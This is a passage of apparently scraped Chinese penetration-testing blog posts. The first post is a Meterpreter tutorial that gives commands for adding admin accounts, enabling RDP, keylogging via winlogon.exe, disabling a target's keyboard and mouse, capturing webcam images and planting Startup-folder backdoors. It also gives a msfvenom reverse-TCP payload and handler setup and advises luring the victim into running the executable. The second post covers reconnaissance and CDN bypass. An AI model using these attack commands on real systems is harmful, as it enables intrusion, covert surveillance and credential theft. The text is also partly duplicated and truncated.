alt="image-20250408165236346"></p><h3 id="7-12-创建一个新账号："><a href="#7-12-创建一个新账号：" class="headerlink" title="7.12 创建一个新账号："></a><strong>7.12 创建一个新账号：</strong></h3><p>先查看目标主机有哪些用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">run post/windows/gather/enum_logged_on_users <br></code></pre></td></tr></table></figure><p>在目标系统中创建一个新的用户账号的方法一：</p><p>注：这个命令会创建用户，并把他添加到 Administrators 组中，这样该用户就拥有远程桌面的权限了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apl">run getgui -u 用户 -p 密码<br>-u: 指定用户<br>-p: 指定密码<br></code></pre></td></tr></table></figure><p>在目标系统中创建一个新的用户账号的方法二：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apl">enable_rdp脚本:<br>run post/windows/manage/enable_rdp USERNAME=cherry PASSWORD=123456    #添加用户<br>run post/windows/manage/enable_rdp                                    #开启远程桌面<br>run post/windows/manage/enable_rdp FORWARD=true LPORT=6662            #将3389端口转发到6662<br></code></pre></td></tr></table></figure><h3 id="7-13-启用远程桌面："><a href="#7-13-启用远程桌面：" class="headerlink" title="7.13 启用远程桌面："></a><strong>7.13 启用远程桌面：</strong></h3><ul><li><p>当我们新添加的用户已经拥有远程桌面之后，我们就可以使用这个账号凭证来开启远程桌面会话了。</p></li><li><p>首先，我们需要确保目标Windows设备开启了远程桌面功能（需要开启多个服务），我们输入：<code>run post/windows/manage/enable_rdp</code>命令可以开启远程桌面。</p></li><li><p>在开启远程桌面会话之前，我们还需要使用<code>idletime命令</code>检查远程用户的空闲时长：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">idletime<br></code></pre></td></tr></table></figure><h3 id="7-14-键盘记录"><a href="#7-14-键盘记录" class="headerlink" title="7.14 键盘记录:"></a><strong>7.14 键盘记录:</strong></h3><p>Meterpreter还可以在目标设备上实现键盘记录功能，键盘记录主要涉及以下三种命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apl">keyscan_start： #开启键盘记录功能，开关键盘记录功能后目标输入的内容我们就通过keyscan_dump命令在Meterpreter里面进行查看；<br>keyscan_dump：  #显示捕捉到的键盘记录信息<br>keyscan_stop：  #停止键盘记录功能<br></code></pre></td></tr></table></figure><p>注：在使用键盘记录功能时，通常需要跟目标进程进行绑定，接下来我们介绍如何绑定进程，然后获取该进程下的键盘记录。</p><h3 id="7-15-进程迁移："><a href="#7-15-进程迁移：" class="headerlink" title="7.15 进程迁移："></a><strong>7.15 进程迁移：</strong></h3><p>Meterpreter 既可以单独运行，也可以与其他进程进行绑定。因此，我们可以让Meterpreter与类似explorer.exe这样的进程进行绑定，并以此来实现持久化。</p><p>在下面的例子中，我们会将<code>Meterpreter</code>跟 <code>winlogon.exe</code>绑定，并在登录进程中捕获键盘记录，以获得用户的密码。</p><p>首先，我们需要使用：<code>ps</code> 命令查看目标设备中运行的进程：</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/39a926b9ae82af9e2ab6772c77522400.png" alt="image-20250408170914111"></p><p>我们可以使用：<code>getpid</code> 查看我们当前的进程id：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">getid<br></code></pre></td></tr></table></figure><p>使用：<code>migrate</code>+<code>目标进程ID</code>命令来绑定目标进程id，可以看到通过进程迁移后，当前的<code>Meterpreter</code>的<code>pid</code>已经和 <code>winlogon.exe</code>一样了</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/24b867891aa95df5f3fcfb69f252fbc0.png" alt="image-20250408171334516"></p><p>这里绑定目标pid的时候，经常会断了shell。进程迁移后会自动关闭原来Meterpreter进程，没有关闭可使用 <code>kill pid</code> 命令关闭进程。</p><p>或者使用自动迁移进程（<code>run post/windows/manage/migrate</code>）命 令，系统会自动寻找合适的进程然后迁移。</p><h3 id="7-16-禁止目标主机使用键盘鼠标"><a href="#7-16-禁止目标主机使用键盘鼠标" class="headerlink" title="7.16 禁止目标主机使用键盘鼠标"></a><strong>7.16 禁止目标主机使用键盘鼠标</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apl">uictl  disable(enable) keyboard  #禁止(允许)目标使用键盘<br>uictl  disable(enable) mouse     #禁止(允许)目标使用鼠标<br></code></pre></td></tr></table></figure><h3 id="7-17-用目标主机摄像头拍照："><a href="#7-17-用目标主机摄像头拍照：" class="headerlink" title="7.17 用目标主机摄像头拍照："></a><strong>7.17 用目标主机摄像头拍照：</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apl">webcam_list    #获取目标系统的摄像头列表<br>webcam_snap    #从指定的摄像头，拍摄照片<br>webcam_stream  #从指定的摄像头，开启视频<br></code></pre></td></tr></table></figure><h3 id="7-18-常用扩展库介绍"><a href="#7-18-常用扩展库介绍" class="headerlink" title="7.18 常用扩展库介绍"></a><strong>7.18 常用扩展库介绍</strong></h3><p>meterpreter中不仅有基本命令还有很多扩展库，下面就介绍一下常用的扩展库的查看方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apl">load/use     #加载模块<br>load -l      #列出所有可用的扩展<br>load -help   #帮助；说明<br>run          #执行一个已有的模块<br></code></pre></td></tr></table></figure><p>注：这里输入run后，双击Tab键列出所有的已有的脚本；</p><h3 id="7-19-生成持续性后门（重点）："><a href="#7-19-生成持续性后门（重点）：" class="headerlink" title="7.19 生成持续性后门（重点）："></a><strong>7.19 生成持续性后门（重点）：</strong></h3><p>因为<code>meterpreter</code> 是基于<code>内存DLL</code>建立的连接，所以，只要目标主机关机，我们的连接就会断。总不可能我们每次想连接的时候，每次都去攻击，然后再利用 meterpreter 建立连接。所以，我们得在目标主机系统内留下一个持续性的后门，只要目标主机开机了，我们就可以连接到该主机。</p><p>建立持续性后门有两种方法，一种是通过<code>启动项启动(persistence)</code>，一种是通过<code>服务启动(metsvc)</code></p><h3 id="7-19-1-启动项启动："><a href="#7-19-1-启动项启动：" class="headerlink" title="7.19.1 启动项启动："></a><strong>7.19.1 启动项启动：</strong></h3><p>启动项启动的话，我们先生成一个后门木马。</p><p>需要去学习怎么生成后门木马 todo</p><p>然后放到<code>windows的启动目录</code>中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Users\$username$\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<br></code></pre></td></tr></table></figure><p>这样这个后门每次开机就都能启动了，然后我们只要相连就监听相应的端口就行了。</p><h1 id="msf制作反弹shell"><a href="#msf制作反弹shell" class="headerlink" title="msf制作反弹shell"></a>msf制作反弹shell</h1><h2 id="1-制作反弹shell-exe文件"><a href="#1-制作反弹shell-exe文件" class="headerlink" title="1.制作反弹shell-exe文件"></a>1.制作反弹shell-exe文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=kaili的ip地址 LPORT=5577 -f exe -o /root/test.exe<br><br>LHOST    kaili的ip地址<br>LPORT    为反弹端口<br>test.exe 为生成文件<br></code></pre></td></tr></table></figure><p>木马生成成功：</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/798ab6693aca139d789caf683337f219.png" alt="image-20250411110707974"></p><p>然后把木马传输到主机</p><h2 id="2-控制端启动msfconsole，获取监听"><a href="#2-控制端启动msfconsole，获取监听" class="headerlink" title="2.控制端启动msfconsole，获取监听"></a>2.控制端启动msfconsole，获取监听</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br>msf5 &gt; use exploit/multi/handler<br>msf5 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp<br>msf5 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> LHOST 0.0.0.0<br>msf5 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> LPORT 5577<br>msf5 exploit(multi/handler) &gt; run<br><br>一句话：<br>handler -p windows/meterpreter/reverse_tcp -H kaili的ip地址 -P 5577<br></code></pre></td></tr></table></figure><p>这时候只需要诱惑点击我们的test.exe文件。我们就可以进入到meterpreter界面了。</p><h2 id="3-反弹成功"><a href="#3-反弹成功" class="headerlink" title="3.反弹成功"></a>3.反弹成功</h2><p>因为我win7拖拽文件有问题。这里我使用Win10做靶机。</p><p>成功获取到对话：</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/34d1f6da425cb3c8e328d6eae9bca64e.png" alt="image-20250411111842192"></p><p>我们输入： <code>shell</code>即可切换到目标主机的<code>windows cmd_shell</code>里面：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">shell         #获取目标主机的cmd_shell权限<br>chcp 65001    #这里为了避免目标主机cmd_shell字符乱码，设置目标主机命令行的字符编码，65001是UTF-8<br></code></pre></td></tr></table></figure><p>然后把木马传输到主机</p><h2 id="2-控制端启动msfconsole，获取监听-1"><a href="#2-控制端启动msfconsole，获取监听-1" class="headerlink" title="2.控制端启动msfconsole，获取监听"></a>2.控制端启动msfconsole，获取监听</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br>msf5 &gt; use exploit/multi/handler<br>msf5 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp<br>msf5 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> LHOST 0.0.0.0<br>msf5 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> LPORT 5577<br>msf5 exploit(multi/handler) &gt; run<br><br>一句话：<br>handler -p windows/meterpreter/reverse_tcp -H kaili的ip地址 -P 5577<br></code></pre></td></tr></table></figure><p>这时候只需要诱惑点击我们的test.exe文件。我们就可以进入到meterpreter界面了。</p><h2 id="3-反弹成功-1"><a href="#3-反弹成功-1" class="headerlink" title="3.反弹成功"></a>3.反弹成功</h2><p>因为我win7拖拽文件有问题。这里我使用Win10做靶机。</p><p>成功获取到对话：</p><p>[外链图片转存中…(img-iM5SHzMh-1744342215955)]</p><p>我们输入： <code>shell</code>即可切换到目标主机的<code>windows cmd_shell</code>里面：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">shell         #获取目标主机的cmd_shell权限<br>chcp 65001    #这里为了避免目标主机cmd_shell字符乱码，设置目标主机命令行的字符编码，65001是UTF-8<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息收集</title>
    <link href="/2025/04/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2025/04/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> 在渗透测试过程前，应先获取对应的授权，然后甲方会将需要进行渗透测试的资产信息详细罗列出来，但也不排除会遇到直接给你个域名&#x2F;ip的甲方，那么就需要我们自己对给出的域名&#x2F;ip进行信息收集。</p><h2 id="1、收集域名信息"><a href="#1、收集域名信息" class="headerlink" title="1、收集域名信息"></a>1、收集域名信息</h2><h3 id="1-1-Whois查询"><a href="#1-1-Whois查询" class="headerlink" title="1.1. Whois查询"></a>1.1. Whois查询</h3><p> whois查询可以查到注册域名的时候留下的信息。比如注册商、注册人、邮箱、DNS解析服务器、注册人联系电话及更多的域名等，因为域名注册人可能是网站管理员，可以尝试社工、套路，查询是不是注册了其他域名扩大攻击范围。根据这些信息可以尝试制作社工密码，或者查出更多的资产等等。还有域名服务商、域名服务器、域名拥有者等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apl">https://beian.miit.gov.cn/#/Integrated/index工信部备案网站<br>https://www.beian.gov.cn/portal/registerSystemInfo公安备案网站<br>http://whois.chinaz.com/站长之家<br>https://whois.aizhan.com/爱站网<br>https://webwhois.cnnic.cn/WelcomeServlet中国互联网信息中心<br>https://whois.cloud.tencent.com/腾讯云<br>https://whois.aliyun.com/阿里云<br>http://whois.xinnet.com/domain/whois/index.jsp新网<br>反查邮箱链接<br>https://bbs.fobshanghai.com/checkemail.html福人<br>https://www.benmi.com/rwhoiswhois反查<br>http://whois.chinaz.com/reverse?ddlSearchMode=1站长工具<br>https://phonebook.czphonebook<br>https://hunter.io/hunter<br></code></pre></td></tr></table></figure><h3 id="1-2-子域名收集"><a href="#1-2-子域名收集" class="headerlink" title="1.2. 子域名收集"></a>1.2. 子域名收集</h3><p> 进行子域名收集可以扩大攻击范围、还可以发现隐藏的资产以及了解目标网络的结构情况，也可以在主站点没有web安全漏洞或者设置了WAF等安全产品等情况导致无法进行边界突破时，可以考虑对子域名进行渗透测试。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apl">子域名爆破<br>https://github.com/euphrat1ca/LayerDomainFinder layer子域名挖掘机<br>https://github.com/lijiejie/subDomainsBrute     subDomainsBrute<br>https://github.com/shmilylty/OneForAll         OneforAll<br>https://github.com/aboul3la/Sublist3r         Sublist3r<br>https://github.com/laramies/theHarvester     theHarvester<br>https://github.com/projectdiscovery/subfinder subfinder<br>https://github.com/knownsec/ksubdomain         ksubdomain<br></code></pre></td></tr></table></figure><h3 id="1-3-ICP-备案查询"><a href="#1-3-ICP-备案查询" class="headerlink" title="1.3. ICP 备案查询"></a>1.3. ICP 备案查询</h3><p>ICP 备案查询可以找到目标的备案信息，还能知道目标可能不止备案了一个域名，收集目标的其他域名，若看到ICP 备案是<code>XXXX-1</code>，这里<code>-1</code>就是说明这个备案下不单单只有这一个域名，还有其他的域名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apl">https://beian.miit.gov.cn/#/Integrated/index工信部备案<br>https://www.beian.gov.cn/portal/registerSystemInfo公安备案<br>http://icp.chinaz.com/站长之家<br>https://www.aizhan.com/cha/爱站网<br></code></pre></td></tr></table></figure><h3 id="1-4-SSL-证书查询"><a href="#1-4-SSL-证书查询" class="headerlink" title="1.4. SSL 证书查询"></a>1.4. SSL 证书查询</h3><p>SSL&#x2F;TLS证书通常包含域名、子域名和邮件地址、证书状态等信息，结合证书中的信息，可以更快速地定位到目标资产，获取到更多目标资产的相关信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apl">https://myssl.com                SSL/TLS安全评估报告<br>https://crt.sh/                    crt.sh<br>https://spyse.com/tools/ssl-lookupSPYSE<br>https://censys.io/                censy<br></code></pre></td></tr></table></figure><h3 id="1-5-DNS记录查询"><a href="#1-5-DNS记录查询" class="headerlink" title="1.5.DNS记录查询"></a>1.5.DNS记录查询</h3><p>可以查看 IP 与 域名绑定的历史记录所有历史记录，扩大资产搜索范围，若目标有做cdn加速，也可用来寻找绕过cdn的方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apl">https://dnsdb.io/zh-cnlDnsdb<br>https://site.ip138.com查询网<br>https://ti.360.net/#/homepage360威胁情报中心<br>https://x.threatbook.com微步在线<br>https://viewdns.infoviewdns.info<br>https://securitytrails.comsecuritytrails<br>https://tools.ipip.net/cdn.phptools.ipip<br></code></pre></td></tr></table></figure><h2 id="2、寻找收集真实ip"><a href="#2、寻找收集真实ip" class="headerlink" title="2、寻找收集真实ip"></a>2、寻找收集真实ip</h2><p> 在测试过程中需要获取真实的<code>IP</code>，如果目标有做cdn加速，获取到的是<code>CDN</code>地址，是没什么意义的，比如你获取到的真实的 IP，就可以直接测试那些端口开放了，同时针对这些端口所开放的服务，采取不同的手段来进行测试。一般都是大型企业会做，小企业不会做。</p><h3 id="2-1识别cdn"><a href="#2-1识别cdn" class="headerlink" title="2.1识别cdn"></a>2.1识别cdn</h3><h4 id="2-1-1get请求"><a href="#2-1-1get请求" class="headerlink" title="2.1.1get请求"></a>2.1.1get请求</h4><p> GET 请求页面&#x2F;文件地址，查看 HTTP 响应头中是否存在 “cache xxx” 的值，若存在，则表示有走 CD</p><h4 id="2-1-2Ping域名"><a href="#2-1-2Ping域名" class="headerlink" title="2.1.2Ping域名"></a>2.1.2Ping域名</h4><p> 默认情况下你去 ping 一个地址的时候，返回的地址应该是差不多的，但是当变成很长一段的时候，大概率是经过跳转加速的，那么就可能存在<code>CDN</code>。</p><h4 id="2-1-3nslookup解析"><a href="#2-1-3nslookup解析" class="headerlink" title="2.1.3nslookup解析"></a>2.1.3nslookup解析</h4><p> 若解析结果有多个，多半可能存在CDN，相反，若解析结果只有一个，可能不存在CDN(不能肯定）</p><h4 id="2-1-4使用在线网站搜索"><a href="#2-1-4使用在线网站搜索" class="headerlink" title="2.1.4使用在线网站搜索"></a>2.1.4使用在线网站搜索</h4><p>采用各地 dns 解析的方式来判断是否存在cdn，如果ip一致则不存在相反就是存在的。</p><h3 id="2-2绕过cdn"><a href="#2-2绕过cdn" class="headerlink" title="2.2绕过cdn"></a>2.2绕过cdn</h3><h4 id="2-2-1查目标网站的子域名"><a href="#2-2-1查目标网站的子域名" class="headerlink" title="2.2.1查目标网站的子域名"></a>2.2.1查目标网站的子域名</h4><p> 使用<code>CDN</code>是需要花钱的，所以一般厂商都会在主站上实施<code>CDN</code>，所以可以尝试找其他子域名，来绕过<code>CDN</code>。同时绕 CDN 有时候是需要运气的，不是百分百能够绕过。</p><h4 id="2-2-2HTML-页面信息匹配"><a href="#2-2-2HTML-页面信息匹配" class="headerlink" title="2.2.2HTML 页面信息匹配"></a>2.2.2HTML 页面信息匹配</h4><p> 在网站首页的源码中找到标题titie，然后到fofa来进行titie搜索匹配，然后逐个查看。</p><h4 id="2-2-3利用证书序列号"><a href="#2-2-3利用证书序列号" class="headerlink" title="2..2.3利用证书序列号"></a>2..2.3利用证书序列号</h4><p> 网站证书是一串16进制字符，先通过在线网站将其调整为10进制，然后在fofa中使用cert 语法进行查询，域名和ip能够都访问网站就为真实ip。</p><h4 id="2-2-4利用邮件去查"><a href="#2-2-4利用邮件去查" class="headerlink" title="2..2.4利用邮件去查"></a>2..2.4利用邮件去查</h4><p> 接收目标网站的邮件，通过邮件头信息获取真实IP地址。</p><h4 id="2-2-5-DNS历史解析记录"><a href="#2-2-5-DNS历史解析记录" class="headerlink" title="2.2.5.DNS历史解析记录"></a>2.2.5.DNS历史解析记录</h4><p> 有一些网站可以查询到DNS历史解析记录，可能在很多网站并未采用cdn时候的解析记录就被记录了下来，之后也并未更换服务器，此时就能查询到真实IP地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apl">https://dnsdb.io/zh-cnlDnsdb<br>https://site.ip138.com查询网<br>https://ti.360.net/#/homepage360威胁情报中心<br>https://x.threatbook.com微步在线<br>https://viewdns.infoviewdns.info<br>https://securitytrails.comsecuritytrails<br>https://tools.ipip.net/cdn.phptools.ipip<br></code></pre></td></tr></table></figure><h4 id="2-2-6国外地址请求"><a href="#2-2-6国外地址请求" class="headerlink" title="2.2.6国外地址请求"></a>2.2.6国外地址请求</h4><p> 如果CDN仅在国内加速，可以尝试从国外服务器访问，可能会暴露真实IP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apl">https://www.wepcc.com/                wepcc<br>http://www.ab173.com/dns/dns_world.phpab173<br>https://dnsdumpster.com/            dnsdumpster<br>https://who.is/whois/zkaq.cn        who.is<br></code></pre></td></tr></table></figure><h2 id="3、收集旁站或-C-段-IP"><a href="#3、收集旁站或-C-段-IP" class="headerlink" title="3、收集旁站或 C 段 IP"></a>3、收集旁站或 C 段 IP</h2><p> 有时候主站我们测试不了，我们就可以对旁站进行测试，由于某些大厂业务较多，可能会买很多的公网<code>IP</code>，而且这些厂商在购买公网<code>IP</code>的时候，不太可能会去说某一个网段买一个<code>IP</code>，另外一个网段再买一个<code>IP</code>的，基本上都是在一个网段中挑几个连续的或者直接买一个网段。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apl">https://nmap.org/download.html            Nmap<br>https://gobies.org/                        Goby<br>https://github.com/0x727/ShuiZe_0x727    水泽<br>https://github.com/shadow1ng/fscan        fscan<br>https://github.com/EdgeSecurityTeam/EHoleEHole(棱洞)<br>https://github.com/codeyso/CodeTest        ARL灯塔<br></code></pre></td></tr></table></figure><h3 id="3-1、旁站"><a href="#3-1、旁站" class="headerlink" title="3.1、旁站"></a>3.1、旁站</h3><p> 同服务器不同站点</p><p> 旁站指的是网站所在服务器上部署的其他网站，同IP网站，一个IP上布置了多个网站 从同台服务器上的其他网站入手，获取到服务器权限，自然就获取到了目标网站的权限</p><h3 id="3-2、-c段"><a href="#3-2、-c段" class="headerlink" title="3.2、 c段"></a>3.2、 c段</h3><p> 同网段不同的服务器</p><p> C 段嗅探指的是拿下同一C段下的服务器，也就是说是c段1-255中的一台服务器，再通过内网横向移动获取你想要的服务器权限。</p><p>注意：一般情况下云服务器C段的IP都是相互独立的，这些服务器分属不同用户，没有渗透的必要</p><p>注意：探测C段时一定要确认ip是否归属于目标，因为一个C段中的所有ip不一定全部属于目标。</p><h2 id="4、收集端口及服务"><a href="#4、收集端口及服务" class="headerlink" title="4、收集端口及服务"></a>4、收集端口及服务</h2><p> 通过<code>IP</code>地址获取到上面的端口，如何通过端口判断服务，通过服务的版本等等信息获取相关历史漏洞或者密码爆破等。</p><h3 id="4-1、主机发现"><a href="#4-1、主机发现" class="headerlink" title="4.1、主机发现"></a>4.1、主机发现</h3><p> 主机发现可以发现的信息包括目标主机的存活状态、IP地址、端口开放情况等。‌‌</p><h3 id="4-2、端口扫描"><a href="#4-2、端口扫描" class="headerlink" title="4.2、端口扫描"></a>4.2、端口扫描</h3><p> 可以发现目标主机的端口开放情况。</p><h3 id="4-3、版本探测"><a href="#4-3、版本探测" class="headerlink" title="4.3、版本探测"></a>4.3、版本探测</h3><p> 可以发现目标主机的邮件、系统版本、服务器版本。有一个精确的版本号对了解服务器有什么漏洞有巨大的帮助。</p><h3 id="4-1、工具"><a href="#4-1、工具" class="headerlink" title="4.1、工具"></a>4.1、工具</h3><p> nmap、masscan、御剑等</p><h3 id="4-2、插件探测"><a href="#4-2、插件探测" class="headerlink" title="4.2、插件探测"></a>4.2、插件探测</h3><p> Fofa Pro view</p><p> shodan</p><h2 id="5、收集网站指纹"><a href="#5、收集网站指纹" class="headerlink" title="5、收集网站指纹"></a>5、收集网站指纹</h2><p> 在渗透测试中，对目标服务器进行指纹识别是非常有必要的，因为只有识别出相应的<code>web</code>容器或者<code>CMS</code>，才能查看与其相关的漏洞，然后利用可用的漏洞进行相应的渗透测试。</p><h3 id="5-1识别对象："><a href="#5-1识别对象：" class="headerlink" title="5.1识别对象："></a>5.1识别对象：</h3><p> 1、CMS信息：比如大汉CMS、织梦、帝国CMS、phpcms、ecshop等；</p><p> 2、前端技术：比如HTML5、jquery、bootstrap、pure、ace等；</p><p> 3、Web服务器：比如Apache、lighttpd, Nginx, IIS等；</p><p> 4、应用服务器：比如Tomcat、Jboss、weblogic、websphere等；</p><p> 5、开发语言：比如PHP、Java、Ruby、Python、C#等；</p><p> 6、操作系统信息：比如linux、win2008、win7、kali、centos等；</p><p> 7、CDN信息：是否使用CDN，如cloudflare、360cdn、365cyd、yunjiasu等；</p><p> 8、WAF信息：是否使用waf，如Topsec、safedog、Yundun等；</p><p> 9、IP及域名信息：IP和域名注册信息、服务商信息等；</p><p> 10、端口信息：有些软件或平台还会探测服务器开放的常见端口。</p><h3 id="5-2工具"><a href="#5-2工具" class="headerlink" title="5.2工具"></a>5.2工具</h3><p>WAF识别： wafw00f：<a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p><p>在线工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apl">http://whatweb.bugscaner.com/look/ bugscaner 需要扫码登录<br>https://fp.shuziguanxing.com/#/     数字观星<br>http://www.yunsee.cn/finger.html 云悉 需注册<br>http://sso.tidesec.com/             潮汐<br>http://whatweb.bugscaner.com/look/ whatweb<br>https://github.com/search?q=cms识别github查找<br></code></pre></td></tr></table></figure><h3 id="5-3插件"><a href="#5-3插件" class="headerlink" title="5.3插件"></a>5.3插件</h3><h2 id="6、收集敏感信息"><a href="#6、收集敏感信息" class="headerlink" title="6、收集敏感信息"></a>6、收集敏感信息</h2><p> 由于发布网站时，服务器配置问题，导致目录能够在浏览器中打开，从而引起信息泄露，造成安全隐患。例如你在网站目录下放置<code>1.txt</code>，而这个<code>1.txt</code>中存放网站的密码，那么这样攻击者通过该手段这样就能够直接登录网站了。</p><h2 id="6-1-robots-txt"><a href="#6-1-robots-txt" class="headerlink" title="6.1.robots.txt"></a>6.1.robots.txt</h2><p> Robots协议(Robots Exclusion Protocol)“网络爬虫排除标准”，网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取，同时也记录网站所具有基本的目录</p><h2 id="6-2-目录信息收集"><a href="#6-2-目录信息收集" class="headerlink" title="6.2. 目录信息收集"></a>6.2. 目录信息收集</h2><p> 通过扫描目录和文件，大致了解同站的的结构，获取突破点，比如后台，文件备份，上传点等。</p><p> 目录扫描，主要扫描敏感信息、隐藏的目录和api、代码仓库、备份文件等。工具有：各种御剑，dirmap，Dirsearch，dirbuster，7kbstorm，gobuster等等。</p><h2 id="6-3-代码管理工具信息泄露"><a href="#6-3-代码管理工具信息泄露" class="headerlink" title="6.3. 代码管理工具信息泄露"></a>6.3. 代码管理工具信息泄露</h2><p> 主要是出现在搭建网站的时候会出现源码泄露的情况，很多情况下我们都是对网站进行黑盒测试，而如果获取到源码后，那么漏洞相当于自己送过来。</p><p> <a href="https://zhuanlan.zhihu.com/p/110389472">https://zhuanlan.zhihu.com/p/110389472</a></p><h2 id="6-4网站扫描"><a href="#6-4网站扫描" class="headerlink" title="6.4网站扫描"></a>6.4网站扫描</h2><p> 网站漏洞扫描，各种扫描器了。如：nessus，极光，xray，AWVS，goby，AppScan，各种大神团队自己编写的扫描器等等。</p><h2 id="6-5-JS信息收集"><a href="#6-5-JS信息收集" class="headerlink" title="6.5.JS信息收集"></a>6.5.JS信息收集</h2><p> 在JS中可能会存在大量的敏感信息，包括但不限于：</p><ul><li><p>某些服务的接口，可以测试这些接口是否有未授权等</p></li><li><p>子域名，可能包含有不常见或者子域名收集过程中没收集到的目标</p></li><li><p>密码、secretKey等敏感数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 